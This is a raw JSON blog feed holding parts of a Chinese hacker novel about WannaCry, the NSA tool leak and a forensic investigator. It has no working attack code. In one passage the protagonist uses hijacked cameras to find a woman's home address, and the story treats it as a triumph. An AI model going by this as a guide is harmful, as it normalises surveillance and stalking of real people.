id=\&#34;解雇\&#34;&gt;解雇&lt;/h2&gt;\n&lt;p&gt;王梓在写着代码，旁边的两个同事在讨论。&lt;/p&gt;\n&lt;p&gt;同事小王先开口说道：“听说最近公司要裁员，咱们哥几个可得好好表现下，别被裁了，特殊时期可别往枪口上撞啊。”&lt;/p&gt;\n&lt;p&gt;“你这消息真的假的啊？”同事小张半信半疑地问道。&lt;/p&gt;\n&lt;p&gt;“这还能有假，其他几个部门已经有人被开除了。”&lt;/p&gt;\n&lt;p&gt;“那你是从哪里得到的消息啊？”&lt;/p&gt;\n&lt;p&gt;“另外一个部门的同事跟我说的，消息绝对可靠。没准啊，下一个就该我们部门喽～”&lt;/p&gt;\n&lt;p&gt;此时王梓部门的领导走了过来，旁边的两个人赶紧装作忙工作的样子。&lt;/p&gt;\n&lt;p&gt;“王梓，你到我办公室来一趟。”&lt;/p&gt;\n&lt;p&gt;王梓起身，朝领导办公室走去。旁边的两个同事面面相觑。小张先说话了：“你这乌鸦嘴，还真是，看来他这次要被开喽，他写的代码经常有bug（注解1：），有几次还是我给他调好的呢。平时就不爱说话，也不跟人交流，难怪技术那么差。”&lt;/p&gt;\n&lt;p&gt;“是啊，我也给他改过几次呢。咱们先准备准备，领导如果找咱们了，咱们跟领导求求情。”&lt;/p&gt;\n&lt;p&gt;“嗯，好。”&lt;/p&gt;\n&lt;p&gt;王梓来到领导办公室。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第五章 恶作剧&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;nfc&#34;,&#34;slug&#34;:&#34;U1WQAo4wQ7A&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/U1WQAo4wQ7A/&#34;},{&#34;name&#34;:&#34;脏牛&#34;,&#34;slug&#34;:&#34;SYW0qvdVS1g&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/SYW0qvdVS1g/&#34;},{&#34;name&#34;:&#34;acr122u&#34;,&#34;slug&#34;:&#34;KqKnnYou3rA&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/KqKnnYou3rA/&#34;}],&#34;date&#34;:&#34;2020-03-17 13:21:04&#34;,&#34;dateFormat&#34;:&#34;2020-03-17&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Five.jpeg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Five/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;16 min read&#34;,&#34;time&#34;:927000,&#34;words&#34;:4593,&#34;minutes&#34;:16},&#34;description&#34;:&#34;黑客，月光下的魔术师。一个看似固若金汤，并投入了巨大的财力、人力、物力打造网络安全防护系统。每天有专人盯着，并可以随时触碰到。就是这样的系统，黑客往往也只会微微一笑，以你意想不到的方式去侵入你的系统。他们喜欢黑夜，他们在黑暗中默默的监视着你...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%A7%A3%E9%9B%87\&#34;&gt;解雇&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%BA%A6%E4%BC%9A\&#34;&gt;约会&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B5%B7%E5%8D%97\&#34;&gt;海南&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%9C%AF%E8%AF%AD%E8%A7%A3%E9%87%8A\&#34;&gt;术语解释&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;暗流\&#34;&gt;暗流&lt;/h2&gt;\n&lt;p&gt;暗潮涌动，当浮现出来的那一刻，必定是一场惊涛骇浪。50亿的信息泄漏已经够让人膛目结舌。似乎国内因为这一切变得平静，而在国际上，维基解密网站发布CIA使用的黑客工具包，一群网络中一名名为“影子”的组织劲爆出美国NSA使用的网络武器库。这个超级网络武器库对黑客们来说无疑是一场饕餮大餐。那黑夜中无数双眼睛变得无比的亮，各自忙碌着。&lt;/p&gt;\n&lt;p&gt;王梓看着这个超级武器库，内心大吃一惊，技术超前，覆盖全面，内容丰富。这注定是一个无眠的夜晚，王梓不断对其进行分析，并完善到自己的武器库中。&lt;/p&gt;\n&lt;p&gt;不止一次让王梓深深的感觉到人外有人，天外有天。单单靠他一个人不行，如今已不是个人英雄主义的时代。他需要伙伴，一起并肩作战的伙伴。就如网络武器库就是一支有精英队伍所打造出来的。而王梓就要建立一支这样的民间队伍。&lt;/p&gt;\n&lt;p&gt;太阳升起又落下，王梓站起身，伸了伸懒腰。看了下时间，晚上8点钟。正好可以下楼出去，顺便吃点东西。这个时候的晚上生活很是丰富。有穿着时尚又性感的美女在遛狗，有父母带着小孩子在散步的，有说有笑，而在不远处播放着最炫民族风，大妈们正在起劲的跳着广场舞，还有坐在小区椅子的大爷。王梓走在路上，徐徐的微风吹来，吹散了一脸的疲倦，顿时精神起来。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;h2 id=\&#34;初次相遇\&#34;&gt;初次相遇&lt;/h2&gt;\n&lt;p&gt;突然，王梓的肩膀从身后被撞了一下子，他的身子一歪，差点摔倒。此时一位姑娘站在他的面前。这位姑娘戴着一顶深蓝色的鸭舌帽，穿着白色短袖心领T恤，牛仔裤上有几个大的不规则破洞，穿着一双白色球鞋，而脚底下踩着一个滑板。&lt;/p&gt;\n&lt;p&gt;”嘿，对不起！“。姑娘回过头对王梓说。&lt;/p&gt;\n&lt;p&gt;一阵风吹过，吹起了姑娘的长发，王梓这才看清了姑娘的脸，没有化妆，一张圆脸，眼睛的大大的，由于运动的缘故，脸颊微微泛红。跟姑娘的美貌比起来，让人更印象深刻的是一种帅气，整个热干净，清爽。这是王梓内心中的第一印象。&lt;/p&gt;\n&lt;p&gt;姑娘见王梓一直盯着她看不说话。便说了句傻逼，踩着滑板扬长而去。剩下呆愣的王梓站在那里。直到从王梓的肚子发出咕噜的声音，王梓才清醒过来，该去吃东西了。王梓走进了一家小店，人不是特别多，王梓找了个靠墙的位置坐下，点了份蛋炒面。在他的前面一桌，一个小七八岁的小女孩在认真的做作业，小女孩偶尔会探头，当看到王梓正在看她时，她只是冲着王梓嘻嘻笑，然后继续低头做作业。不一会蛋炒面上来了，一份普普通通的蛋炒面，王梓则大口的吃起来。&lt;/p&gt;\n&lt;p&gt;吃完饭回来，王梓继续来完善自己的武器库。对于如此强大的黑客武器，应该充分利用才是，王梓结合他自己做的全球扫描系统——insight，一切编写完成，按下回车，屏幕上的一行行的字符流动着，代表着一台台的电脑被成功控制。&lt;/p&gt;\n&lt;p&gt;在右侧的显示器中，显示着王梓最近刚刚开发完成的天眼系统。这个系统控制了成千上万的摄像头网络，借着这次暴露出来的漏洞，可以控制许许多多企业、工厂的内部摄像头。王梓可以随时查看分布在全球的摄像头，这个系统将可以很好的帮助他定位他想要入侵的目标关联的人。王梓看着这个完成不久的系统，他突然想试试效果。突然，想起今天遇到的帅气女孩。于是，他在天眼的定位系统中输入了小区名字，切换到了摄像头的控制界面，查看这个时间段的小区摄像头，通过不断的切换摄像头，最终确认女孩的门牌号码。王梓在空中打了一个响指，喊了句”bingo“。&lt;/p&gt;\n&lt;h2 id=\&#34;爆发\&#34;&gt;爆发&lt;/h2&gt;\n&lt;p&gt;同一时刻，在网络中的一个角落里，从事者勒索病毒的黑产团伙，正在开始利用NSA的工具，改编成了计算机病毒，开始对全球进行传播，一场网络灾难正在逼近。还沉浸在自我世界中的人们，还没有一点点的感觉。学生们忙着论文；相关机构的电脑正在运行着；小白则刚刚下班回到家中，躺在床上休息。&lt;/p&gt;\n&lt;p&gt;从遥远的大洋彼岸，一串串0和1的数字以光的速度飞向地球上的6大洲（南极洲没有算进去，所以为6大洲）。东方昊天还在弄着自己的论文，突然他的电脑开始增加了一些怪异的文件，过了几秒钟后，他的一些文件开始减少，又过了几秒钟，他的屏幕中心显示了一个红色窗口，上面有勒索的文字和比特币地址，左侧的时间开始计时，东方那以为只是恶作剧，没注意，点击了x关闭窗口，可是窗口过了一秒又出现了，又重试了几次，发现还是不行，就在此刻，在他旁边的几位同学也出现了一样的情况。而在中国其他学校也出现类似的情况，许多人看着屏幕上那关不掉的窗口，无奈。&lt;/p&gt;\n&lt;p&gt;Image&lt;/p&gt;\n&lt;p&gt;就在短短的一天时间里，这个病毒就感染了全球数十个国家的计算机，侵入了无数的重要机构和学校。其中包括银行，公安机关，政府部门，数十所高校，医院等。系统的瘫痪，使得这些机构的正常业务受到影响，无法进行相应的处理。大家都在紧急处理这个事情，一些领导则开始到处找人寻找能够支付比特币的人。这个名为WannaCry的病毒，正如他的名字一样，让许多人想哭。&lt;/p&gt;\n&lt;p&gt;就在各大网络安全公司紧急处理这件事情的时候，大家都在对此病毒议论纷纷的时刻，一名外国年轻人，发现了病毒的一个隐秘开关，就是一长串看似无规则的域名，这个年轻人注册了该域名，使得病毒的传播开始放缓，给了许多人做好防护措施的时间。他是一名安全研究人员，他成了这个网络乱世中耀眼的英雄。而微软也发布了公告，紧急的推出了早已经停止更新的windows xp和windows server2003的系统补丁。&lt;/p&gt;\n&lt;p&gt;朋友圈，微博，微信群，qq群等均被这个红色窗口的病毒所刷爆。面对这场网络灾难，有许多在前线与之对抗；当然也有许多闲的蛋疼的网友把病毒进行各种ps；还有的小孩子为了跟父母要零花钱以中病毒的名字跟父母要钱。奇护公司的人在电脑前紧密的分析着病毒，一行行的汇编代码从它们的眼镜片中映射出来。而大屏幕上显示着病毒全球被感染的情况。不断的有新的进展输出，病毒的防御工具，文件恢复工具，病毒的专杀程序。当然病毒的制造者们也没有闲着，对病毒不断进行修改，并放出。攻与防愈加激烈。&lt;/p&gt;\n&lt;p&gt;因为这个病毒的突然袭来，对于王梓入侵的事情，则早被警察们放到一边。王梓则在这个网络的背后，默默的观察着这一切。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;h2 id=\&#34;相关事件\&#34;&gt;相关事件：&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;公安部破获50亿数据盗窃团伙案，共抓捕96人。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;维基解密公布美国CIA工具包和文档。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;“影子经纪人”公布NSA组织黑客工具包，其中包含入侵银行的文档，windows漏洞攻击工具，以及NSA远程控制工具。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;天眼系统的灵感来自电影速度与激情8。理论上是可以实现的。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Four&#34;,&#34;abstract&#34;:&#34;&lt;h2 id=\&#34;暗流\&#34;&gt;暗流&lt;/h2&gt;\n&lt;p&gt;暗潮涌动，当浮现出来的那一刻，必定是一场惊涛骇浪。50亿的信息泄漏已经够让人膛目结舌。似乎国内因为这一切变得平静，而在国际上，维基解密网站发布CIA使用的黑客工具包，一群网络中一名名为“影子”的组织劲爆出美国NSA使用的网络武器库。这个超级网络武器库对黑客们来说无疑是一场饕餮大餐。那黑夜中无数双眼睛变得无比的亮，各自忙碌着。&lt;/p&gt;\n&lt;p&gt;王梓看着这个超级武器库，内心大吃一惊，技术超前，覆盖全面，内容丰富。这注定是一个无眠的夜晚，王梓不断对其进行分析，并完善到自己的武器库中。&lt;/p&gt;\n&lt;p&gt;不止一次让王梓深深的感觉到人外有人，天外有天。单单靠他一个人不行，如今已不是个人英雄主义的时代。他需要伙伴，一起并肩作战的伙伴。就如网络武器库就是一支有精英队伍所打造出来的。而王梓就要建立一支这样的民间队伍。&lt;/p&gt;\n&lt;p&gt;太阳升起又落下，王梓站起身，伸了伸懒腰。看了下时间，晚上8点钟。正好可以下楼出去，顺便吃点东西。这个时候的晚上生活很是丰富。有穿着时尚又性感的美女在遛狗，有父母带着小孩子在散步的，有说有笑，而在不远处播放着最炫民族风，大妈们正在起劲的跳着广场舞，还有坐在小区椅子的大爷。王梓走在路上，徐徐的微风吹来，吹散了一脸的疲倦，顿时精神起来。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第四章 网络灾难&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;天眼&#34;,&#34;slug&#34;:&#34;cKUjCON7-fC&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cKUjCON7-fC/&#34;},{&#34;name&#34;:&#34;影子经纪人&#34;,&#34;slug&#34;:&#34;ghVeNs1Q_8B&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/ghVeNs1Q_8B/&#34;},{&#34;name&#34;:&#34;维基解密&#34;,&#34;slug&#34;:&#34;C6qQURENiJ7&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/C6qQURENiJ7/&#34;}],&#34;date&#34;:&#34;2020-03-14 11:29:24&#34;,&#34;dateFormat&#34;:&#34;2020-03-14&#34;,&#34;feature&#34;:&#34;https://bacde.me/post-images/Killer-Chapter-Four.jpg&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Four/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;8 min read&#34;,&#34;time&#34;:444000,&#34;words&#34;:2203,&#34;minutes&#34;:8},&#34;description&#34;:&#34;暗流\n暗潮涌动，当浮现出来的那一刻，必定是一场惊涛骇浪。50亿的信息泄漏已经够让人膛目结舌。似乎国内因为这一切变得平静，而在国际上，维基解密网站发布CIA使用的黑客工具包，一群网络中一名名为“影子”的组织劲爆出美国NSA使用的网络武器库。这...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%9A%97%E6%B5%81\&#34;&gt;暗流&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%9D%E6%AC%A1%E7%9B%B8%E9%81%87\&#34;&gt;初次相遇&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%88%86%E5%8F%91\&#34;&gt;爆发&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%9B%B8%E5%85%B3%E4%BA%8B%E4%BB%B6\&#34;&gt;相关事件：&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Jack来到了天成网络公司的总部，他身穿一身白色衬衫，一条浅蓝色牛仔裤，整个人看上去非常的精神。到达后公司的人热情招待，但是Jack则直接拒绝了，要求立刻就要开始进行分析追踪。因为这对他来说，是一次有趣的挑战。他有些迫不及待是一个什么样的人干了这件事情。&lt;/p&gt;\n&lt;p&gt;首先询问了系统部人员的一些网络架构。以及现在企业内部所做的全防护措施。接着他有询问了更加具体的信息，其中包含了文件保存的位置，以及发生的时间点等。通过快速的对话沟通，Jack了解了对方的网络一个大概的安全状况。&lt;/p&gt;\n&lt;p&gt;他跟对方的技术负责人说道：“你们现在的网络情况相对来说做的非常不错，你们目前忽略了公司员工的安全意识，以及目前网络并没有对外流出数据进行一个很好的监控。这使的黑客有机可乘。”&lt;/p&gt;\n&lt;p&gt;“哎呦，您真的是太专业的，我们已经把我们所了解到的都利用上了，同时我们也经常找安全团队来对我们的系统进行入侵测试。然而他们并没有发现什么内容。发现的我们也都已经修复了。”系统部负责人拍了下大腿，高兴的对Jack说道。因为他似乎看到了希望，看到了眼前这个人可以查出入侵者，这样他也就不会被炒鱿鱼了。&lt;/p&gt;\n&lt;p&gt;“如果真的如你说的这般，这次的攻击者也是花了很大的代价来入侵你们，看来对方是真的下了血本，想置你们公司于死地啊。”放心，这次我一定要帮助你们找到真凶。他更加的想要知道究竟是什么样人了。&lt;/p&gt;\n&lt;p&gt;“能有您的加入，那真的是太好了，有什么需要帮助的，需要我们提供的，您就尽管说。我们一定全力配合您。”&lt;/p&gt;\n&lt;p&gt;“好，那我们废话不多说，开始吧。”&lt;/p&gt;\n&lt;p&gt;“好，小王，给Jack倒一杯咖啡。”&lt;/p&gt;\n&lt;p&gt;说着Jack找了个空位置，很不客气的就坐下了，从他的背包中拿出了自己的thinkpad笔记本。上面有一个blackhat的贴纸，看上去非常的酷。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;此时的Jack像一个侠客，而他的笔记本就像是一把宝剑。在电脑开机的那一刻也就是宝剑出鞘的那一刻。而接下来的，就是他与杀手的一场较量。同时这也是网络中白帽子与黑帽子的一次较量。其实，他们都有共同点，那就是对于自由的渴望，以及对困难事物的突破。在寻求突破的过程中获得一步一步走向自由，道突破成功后的成就感与喜悦。&lt;/p&gt;\n&lt;p&gt;Jack以一名攻击者的角度去进行思考，首先他进一步对刚才系统部负责人说的系统架构进行进一步的了解。他输入了www.nosec.org这个网站，并登录了他的账户，他点开了资产检索，输入了天成网络的网站域名，他轻轻点了下鼠标，电脑上就开始不断的显示出关于天成网络的ip地址，以及一些使用的系统信息、以及天成网络员工的信息。&lt;/p&gt;\n&lt;p&gt;图片 1.png&lt;/p&gt;\n&lt;p&gt;nosec网站为真实的。当然图中的目标是假的&lt;/p&gt;\n&lt;p&gt;当然，使用这个系统中获取到的信息，不是全部的。他获取不到天成网络的内部网络（外部无法直接访问的系统）。Jack拿起旁边的咖啡，喝了一口又放下。因为通过之前的了解，他像系统部的人员索要了zabbix系统的账号和密码。查看内部的网络系统情况。&lt;/p&gt;\n&lt;p&gt;Jack快速浏览了这些信息之后，凭借他多年的经验。他迅速的在脑海中圈出了几处重点系统。并对系统部的负责人说：“你们把现在oa系统，crm系统，vpn系统，产品管理系统这几个系统的日志，按照事故发生时间段提取出来，给我一份。”&lt;/p&gt;\n&lt;p&gt;“好，小王，去把Jack刚才说的内容倒出来，并且拷贝给Jack看。”此时系统部的负责人也不管一些公司的规定了，在他看来，现在找到攻击者才是重中之重。&lt;/p&gt;\n&lt;p&gt;“好的，马上”小王迅速应到。&lt;/p&gt;\n&lt;p&gt;“Jack，你看现在最有可能是哪个系统呢？”&lt;/p&gt;\n&lt;p&gt;“这个我不能乱说，要根据实际的分析之后才能得出结论。”&lt;/p&gt;\n&lt;p&gt;“嗯嗯，懂的，我们日志准备好后，就会给您。”&lt;/p&gt;\n&lt;p&gt;过了大概20分钟后&lt;/p&gt;\n&lt;p&gt;“数据已经导出完毕。都在这里了。”小王对着Jack说到。&lt;/p&gt;\n&lt;p&gt;Jack接过他手中的移动硬盘，连入自己的电脑。他运行了星图对，只见电脑中弹出了一个黑色窗口，一行行的绿色字符流过。等待了大概2、3分钟。程序执行完毕。并显示出了一份报告。&lt;/p&gt;\n&lt;p&gt;Jack眼睛开始盯着屏幕，对着屏幕上的报告进行阅读，看着看着，他的眉头就皱的越来越紧。因为他发现，这些系统中没有攻击日志。这让他很是意外。一来可能是他判断错误，二来可能攻击者在临走前已经把这些日志清理掉了。Jack又去查看了原始的日志文件，他发现，有一段时间的日志是没有的。这使得他确认，攻击者把攻击日志清理掉了。看来这次的对手是一个身经百战的老手。而Jack也越来越兴奋起来。&lt;/p&gt;\n&lt;p&gt;2.png&lt;/p&gt;\n&lt;p&gt;“这次的入侵者经验丰富，他已经删除掉了。你们的日志有每天进行备份么？”&lt;/p&gt;\n&lt;p&gt;“有的有的，小王，快去把备份的数据调出来。”&lt;/p&gt;\n&lt;p&gt;“好的，马上。”&lt;/p&gt;\n&lt;p&gt;又过了大概20分钟&lt;/p&gt;\n&lt;p&gt;“好了～，都在硬盘里了。”&lt;/p&gt;\n&lt;p&gt;Jack接过硬盘，首先他将这份备份的文件和最开始的文件进行了比较，然而让他意想不到的是，两个文件大小竟然一样。他打开了最新的文件，一看，突然他瞪大了双眼，竟然跟刚才看的一模一样。这使他大吃一惊。&lt;/p&gt;\n&lt;p&gt;“你确定你这一份是从备份的服务器上导出的。”Jack为了确定是不是小王搞错了。&lt;/p&gt;\n&lt;p&gt;“确定，非常确定。我们的服务器都贴着标签的，而且两台服务器离的很远，绝对不会搞错的。”&lt;/p&gt;\n&lt;p&gt;Jack陷入了思考。这次的确有些棘手，对方不仅经验丰富，手法老道，而且做事不留痕迹。&lt;/p&gt;\n&lt;p&gt;Jack发现从系统日志下手是不行了，看来必须通过其它的入口来寻找黑客的踪迹。&lt;/p&gt;\n&lt;p&gt;“我需要你们被窃取的机密文件的电脑。我要到那台电脑中去寻找相关线索“. Jack对系统部的人说道。&lt;/p&gt;\n&lt;p&gt;“被窃取的资料，客户的信息放在销售部，市场部的相应负责人手中，而制药配方，只有我们的总裁那里才有。这些我们都需要跟领导申请，批准后才可以查。”&lt;/p&gt;\n&lt;p&gt;“好，那你们尽快吧。目前的通过日志分析这条路是行不通了。”&lt;/p&gt;\n&lt;p&gt;“好的，我们这就去跟领导提。您等等”。&lt;/p&gt;\n&lt;p&gt;Jack需要从相关的系统寻找黑客遗漏的蛛丝马迹。那么黑客盗取文件，销毁文件就必须进入过这些电脑系统，一旦登陆这些系统，就会留下系统日志。日志文件中都记录了ip地址。他一边等待着系统部的申请，一边还在思考着如何去追查黑客。&lt;/p&gt;\n&lt;p&gt;铛铛铛，系统部负责人敲了总裁的门。&lt;/p&gt;\n&lt;p&gt;“总裁，我们系统部这边请来的Jack需要分析您和市场部、销售部总监的计算机。通过你们的电脑寻找线索。”&lt;/p&gt;\n&lt;p&gt;“这事批准了。你们把我电脑拿过去吧。另外我会电话跟市场部，销售部的人沟通，你们等电话去取电脑就可以了。”&lt;/p&gt;\n&lt;p&gt;“另外，一定要找到攻击者，将他们绳之以法。赔偿我们的损失。而且速度一定要快，晚了，人都不知道跑哪里去了。”天成网络总裁继续补充道。&lt;/p&gt;\n&lt;p&gt;“好的，那我这就拿过去”。说完，系统部负责人，便直接上去拆总裁的电脑，并叫了一个人过来一起搬走了。&lt;/p&gt;\n&lt;p&gt;系统部负责人把电脑放到Jack面前，并组装好，并说道：“您要的电脑给您拿过来了”。&lt;/p&gt;\n&lt;p&gt;“另外啊，还请您这次务必查出攻击者。真得好好惩罚一下他们这群该死的黑客。”系统部负责人再次的向Jack恳求道。&lt;/p&gt;\n&lt;p&gt;“你放这里吧，我会尽全力找出攻击者的。”&lt;/p&gt;\n&lt;p&gt;“那就拜托您了。有什么需要的尽管吩咐。”&lt;/p&gt;\n&lt;p&gt;Jack一点也没在听系统部负责人说什么，他开启了电脑，他想马上就找到攻击者。过了一会，屏幕上显示了系统的登陆界面。Jack回过头，对着系统负责人说：“密码”！&lt;/p&gt;\n&lt;p&gt;系统部负责人连忙答应，并输入了密码。&lt;/p&gt;\n&lt;p&gt;登入进了系统，Jack二话不说，直接打开了系统中的事件查看器，然而结果跟他预想的一样，登陆信息也都被删除掉了。&lt;/p&gt;\n&lt;p&gt;接下来，他又开启了系统的命令提示符。他在窗口中输入了netstat -ano命令，敲入回车键后，一行行字符串显示出来。同时他又打开了任务管理器。他想通过查看系统中的网络连接情况来确认对方的木马是否还在系统当中。然而这一切的一切，依然没有任何的结果。因为系统中一切运行正常。&lt;/p&gt;\n&lt;p&gt;在此时，市场部的电脑和销售部的电脑也送过来了，他使用同样的思路和方法来进行查看，但是结果也都是如此。&lt;/p&gt;\n&lt;p&gt;Jack坐在桌子前，再次陷入了沉思，难道就黑客真的做的这么彻底？一点痕迹都不留下？&lt;/p&gt;\n&lt;p&gt;此时Jack的手机亮了，他下意识的看了一眼，是一封推广邮件。而就在看到的那一瞬间，他突然眼前一亮，他立马跟系统部的负责人说：“把你们最近一个月的所有员工邮件给找出来，同时把附件导出。我需要检查你们的邮件内容。”&lt;/p&gt;\n&lt;p&gt;Jack想攻击者通过外部的系统很难进入内部网络，所以很有可能通过邮件的方式来攻击内部员工。&lt;/p&gt;\n&lt;p&gt;“好的，稍等。”&lt;/p&gt;\n&lt;p&gt;大概过了2个小时后，系统部的人拿着硬盘过来了，接入了Jack的电脑。Jack把邮件的所有信息都导入了mysql数据库中。他的手在键盘上快速的敲击着，此时四周安静起来，彷佛此时的世界只有他一个人。因为胜利可能就在眼前。&lt;/p&gt;\n&lt;p&gt;Jack开始查询所有的公司以外的人员，以及伪造的邮件信息。时间在一分一秒的过去，Jack从数千封的邮件中过滤着，他的眼睛一直盯着屏幕。也不知道过了多久。就连系统部小王给他倒的咖啡，他也一点没有注意到。而在他的手再次放到键盘上开始敲打的时候，不小心打翻了手边的咖啡。而Jack也没有去管，继续查找着，因为他发现通过外部的邮件跟本没有任何有价值的信息。这时他开始怀疑，莫非攻击者也把邮件记录删除掉了。尽管抱着怀疑的态度，他还是不想就此放弃。他开始寻找内部员工之间的邮件，因为也有可能公司的这次事情就是公司的内鬼干的。洒掉的咖啡从倒下的杯子中缓缓的淌出来，淌到了桌边。同时也浸湿了Jack的袖口。而Jack多次的键盘敲击，使得的袖口上的咖啡也沾到了电脑上。而此时的Jack对此毫无察觉。&lt;/p&gt;\n&lt;p&gt;接下来Jack通过扫描邮件系统中的附件文件，他有了新的发现。有一个相同的木马文件，是由一个销售人员发送给其他的几个人的。&lt;/p&gt;\n&lt;p&gt;而此时的Jack彷佛从他的世界苏醒过来，这时他才意识到撒的咖啡。连忙拿了几张纸将桌子擦干净。&lt;/p&gt;\n&lt;p&gt;他将邮件系统的木马文件放入到了虚拟机中，并运行起来。他通过虚拟机中的运行情况。确定了木马连接的ip地址。他对ip地址进行查询，地理位置显示是韩国。当然，他想也能够想到一个老手，怎么可能用自己的真实ip地址呢。&lt;/p&gt;\n&lt;p&gt;“有进展了，我发现根本原因是你们的员工发送的邮件中有木马，并且他们运行了该款木马。你们可以对发送邮件的这个人进行调查，从邮件发件人的地址来看，他也是你们公司的。另外，木马的控制端ip地址为韩国的一个ip，攻击者使用了跳板服务器。不过目前的这些，足够你们去报案调查的了。你们发送邮件的那个人就是最直接的证据。”Jack给了系统部负责人答案。&lt;/p&gt;\n&lt;p&gt;“真的太好了。您真的是太厉害了，专业。真的是帮我们大忙了。这样，这件事情过后，我一定好好的请您。我这就写一封邮件汇报给我们总裁。”&lt;/p&gt;\n&lt;p&gt;“我要先回去休息一下了。”Jack看了下手中的表。“wow，原来我已经研究了一天一夜了啊。”&lt;/p&gt;\n&lt;p&gt;“是啊，您真的太投入了。我们也没好意思打扰您。您快去休息吧。我这就安排人送你去酒店。”&lt;/p&gt;\n&lt;p&gt;Jack拖着疲惫的身躯走了，而系统部负责人则脸上露出了胜利的微笑。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;p&gt;注：由于对制药公司不了解，所以，以后的都会以天成网络公司来进行描述。&lt;/p&gt;\n&lt;p&gt;##黑客兵器谱&lt;/p&gt;\n&lt;p&gt;星图：全名360星图，360旗下一款日志分析工具。&lt;/p&gt;\n&lt;h2 id=\&#34;术语解释\&#34;&gt;术语解释&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;注解1：zabbix（音同zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;注解2：shell，在计算机科学中，Shell俗称壳（用来区别于核），是指“提供使用者使用界面”的软件，通俗的讲就是在电脑中一个可以与我们进行交互的命令控制界面，我们可以输入系统中存在的命令来控制计算机执行我们想要的操作，webshell，就是网站的shell程序，可以控制网站中的文件、执行命令等操作的程序&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;小知识\&#34;&gt;小知识&lt;/h2&gt;\n&lt;p&gt;查看系统网络连接情况：点击开始－》运行（或者按win＋r键），然后输入cmd，打开命令提示符，在命令提示符中国年输入netstat 